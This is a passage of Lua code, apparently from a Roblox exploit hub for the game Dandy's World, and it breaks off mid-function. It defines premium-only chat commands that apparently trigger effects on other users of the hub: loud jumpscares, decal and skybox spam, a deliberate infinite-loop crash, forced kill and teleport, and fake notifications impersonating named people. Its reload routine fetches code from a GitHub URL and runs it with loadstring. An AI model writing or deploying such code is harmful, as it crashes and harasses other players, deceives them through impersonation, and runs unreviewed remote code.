addcommand("scriptnoxiousdecalspam", "snds", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e noxious"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function test()
	local function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://117458353677051" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://117458353677051"
				Two.Texture = "rbxassetid://117458353677051"
				Three.Texture = "rbxassetid://117458353677051"
				Four.Texture = "rbxassetid://117458353677051"
				Five.Texture = "rbxassetid://117458353677051"
				Six.Texture = "rbxassetid://117458353677051"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	local function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local function replaceTextInGui(guiObject)
		if guiObject:IsA"TextLabel"or guiObject:IsA"TextButton"then
			guiObject.Text = "unable says hi :3"
		end
	end

	local function replaceTextInWorkspace()
		for _, obj in pairs(workspace:GetDescendants()) do
			if obj:IsA"BillboardGui"or obj:IsA"SurfaceGui"then
				for _, child in pairs(obj:GetDescendants()) do
					replaceTextInGui(child)
				end
			end
		end
	end

	replaceTextInWorkspace()

	for _, gui in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
		replaceTextInGui(gui)
	end

	local imageId = "rbxassetid://117458353677051"

	local function createBillboardGui(part)
		if part:FindFirstChildOfClass"BillboardGui"then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	local function addBillboardGuis()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				createBillboardGui(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				createBillboardGui(newDescendant)
			end
		end)
	end

	addBillboardGuis()

	local lighting = game:GetService"Lighting"

	local sky = lighting:FindFirstChildOfClass"Sky"or Instance.new"Sky"

	sky.SkyboxBk = "rbxassetid://117458353677051"
	sky.SkyboxDn = "rbxassetid://117458353677051"
	sky.SkyboxFt = "rbxassetid://117458353677051"
	sky.SkyboxLf = "rbxassetid://117458353677051"
	sky.SkyboxRt = "rbxassetid://117458353677051"
	sky.SkyboxUp = "rbxassetid://117458353677051"

	sky.Parent = lighting
end

addcommand("scriptunabledecalspam", "suds", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e unable"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function conniejumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://122883746467598"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptconniejumpscare", "scjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e cjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function toodlesjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://126828075913555"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scripttoodlesjumpscare", "stjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e tjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function buffpebblejumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://114310119148038"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptbuffpebblejumpscare", "sbpjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e sbpjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function fruitcakejumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://129904337606298"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptfruitcakejumpscare", "sfcjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e fruitjumpscare"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function sharingandandyjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://80342360027781"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptsharingandandyjumpscare", "ssdjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e sdjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function jewelryboxjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://106865200462382"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptjewelryboxjumpscare", "sjbjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e mrjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function albertjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://14351044816"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptalbertjumpscare", "sajs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e ajs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function dandyjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://119960958639124"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptdandyjumpscare", "sdjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e djs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function shellyjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://83275402274555"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptshellyjumpscare", "ssyjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e shelly"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function shrimpo2jumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://128772487557106"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptshrimpo2jumpscare", "sso2js", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e shrimpo2"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function sproutjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://138852543835011"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptsproutjumpscare", "sstjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e sprout"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function shrimpojumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://97212326743600"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7188420724"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.05 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(0)

	fadeOutImage()
end

addcommand("scriptshrimpojumpscare", "ssojs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e sjs"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function flashbang()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://12540062127"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://9069161602"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]
	sound.Pitch = 1

	local sound2 = Instance.new"Sound"		
	sound2.SoundId = "rbxassetid://8754837104"
	sound2.Volume = 2
	sound2.Parent = noxious["player gui"]
	sound2.TimePosition = 0.2
	sound2.Pitch = 0.8

	local sound3 = Instance.new"Sound"		
	sound3.SoundId = "rbxassetid://9125402735"
	sound3.Volume = 2
	sound3.Parent = noxious["player gui"]
	sound3.TimePosition = 0.2
	sound3.Pitch = 0.8

	local function fadeOutImage()
		for i = 0, 1, 0.004 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound2:Play()
	sound3:Play()
	wait(0.1)
	sound:Play()

	wait(0.5)

	fadeOutImage()
end

addcommand("scriptflashbang", "sfb", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e flashbang"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function scaryjumpscare()
	local screenGui = Instance.new"ScreenGui"		
	screenGui.Parent = noxious["player gui"]

	local imageLabel = Instance.new"ImageLabel"		
	imageLabel.Parent = screenGui
	imageLabel.Image = "rbxassetid://10879079287"
	imageLabel.BackgroundTransparency = 1
	imageLabel.Visible = true
	imageLabel.ImageTransparency = 0
	imageLabel.Size = UDim2.new(1, 0, 1, 60)
	imageLabel.Position = UDim2.new(0, 0, 0, -60)
	imageLabel.ZIndex = 6969

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://6600188325"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]

	local function fadeOutImage()
		for i = 0, 1, 0.025 do
			imageLabel.ImageTransparency = i
			wait(0)
		end
		imageLabel:Destroy()
	end

	sound:Play()

	wait(1.8)

	fadeOutImage()
end

addcommand("scriptscaryfacejumpscare", "ssfjs", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e scary jumpscare"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptforcestopplayerinetractions", "sfspi", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e force stop player interactions"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptforcesingthickofit", "sfstoi", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e sing"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptnotify", "sn", function(text)
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync("/e sn " .. text)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local function teleportToPlayer(player)
	local char = player.Character
	if char and char:FindFirstChild("HumanoidRootPart") then
		local localChar = LocalPlayer.Character
		if localChar and localChar:FindFirstChild("HumanoidRootPart") then
			localChar.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
		end
	end
end

addcommand("scriptteleport", "stp", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e teleport"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptkill", "skill", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e die"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function crash()
	while true do
		while true do
			while true do
				while true do
					while true do
					end
				end
			end
		end
	end
end

addcommand("scriptcrash", "scrash", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local _=game.Players.LocalPlayer

	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e crash"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function creepygirlvoice()

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://6723965243"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]
	sound:Play()
end

addcommand("scriptcreepygirlvoice", "scgv", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e creepy girl"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function mancrying()

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://688596285"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]
	sound:Play()
end

addcommand("scriptmancrying", "smc", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e cry 1"		
	end
end)

function womancrying()

	local sound = Instance.new"Sound"		
	sound.SoundId = "rbxassetid://7014161416"
	sound.Volume = 10
	sound.Parent = noxious["player gui"]
	sound:Play()
end

addcommand("scriptwomancrying", "swc", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e cry 2"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptfakeunablenotify", "sfun", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e uj"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptfakeacenotify", "sfan", function()
	if not noxious or not noxious["premium users"] or not table.find(noxious["premium users"], game.Players.LocalPlayer.Name) then
		notify("Unknown command or invalid arguments.", 5, "error")
		return
	end
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e aj"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptfakeqwelvernotify", "sfqn", function()
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e qj"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("scriptfaketeammembernotify", "sftmn", function()
	local ChatService = game:GetService"TextChatService"		
	local channel = ChatService.TextChannels:FindFirstChild"RBXGeneral"

	if channel then
		channel:SendAsync"/e tj"		
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function reloadnoxious()
	_G.dswdnoxiousloaded = false
	closeallnotifs()
	stoprunningconnections()
	execcmd("hdl")

	spawn(function()
		noxious["toggle interface visibility button"].Visible = false
		mainframe.Visible = false
		wait(6)
		noxious["toggle interface visibility button"]:Destroy()
		mainframe:Destroy()
	end)

	loadstring(game:HttpGet("https://raw.githubusercontent.com/Team-Noxious/Noxious-Hub/refs/heads/main/Dandy's%20World/Noxious%20Hub"))()
end

local reloadcommandcallcount = 0

function reloadnoxiouscommand()
	reloadcommandcallcount += 1

	if reloadcommandcallcount == 1 then
		notify("Type command again to confirm.", 5)
	end
	if reloadcommandcallcount == 2 then
		reloadnoxious()
	end
end

local reloadcallcount = 0

noxious["reload noxious button"].MouseButton1Click:Connect(function()
	noxious["click sound"]:Play()

	reloadcallcount += 1

	if reloadcallcount == 1 then
		notify("Click button again to confirm.", 5)
	end

	if reloadcallcount == 2 then
		spawn(function()
			reloadnoxious()
		end)
	end

end)

-------------------------------------------------------------------------------------------------------------------------------

-- Function to add a BillboardGui to the specified target's character
function addBillboardGui(player)
	local function onchar(character)
		local HRP = character:WaitForChild("HumanoidRootPart", 5)  -- Wait for the Head part

		if HRP and not HRP:FindFirstChild"UserImageBillboard"then
			local billboardGui = Instance.new"BillboardGui"				
			billboardGui.Name = "UserImageBillboard"
			billboardGui.Size = UDim2.new(2.5, 0, 2.5, 0)
			billboardGui.AlwaysOnTop = true
			billboardGui.MaxDistance = math.huge -- Set infinite visibility range

			local imageLabel = Instance.new"ImageLabel"				
			imageLabel.Size = UDim2.new(1, 0, 1, 0)
			imageLabel.BackgroundTransparency = 1
			imageLabel.Image = "rbxassetid://100574547642033"  -- Replace with your desired image ID
			imageLabel.ZIndex = 10
			imageLabel.ImageColor3 = Color3.new(1,1,1)

			local uiCorner = Instance.new"UICorner"				
			uiCorner.CornerRadius = UDim.new(0.3, 0)
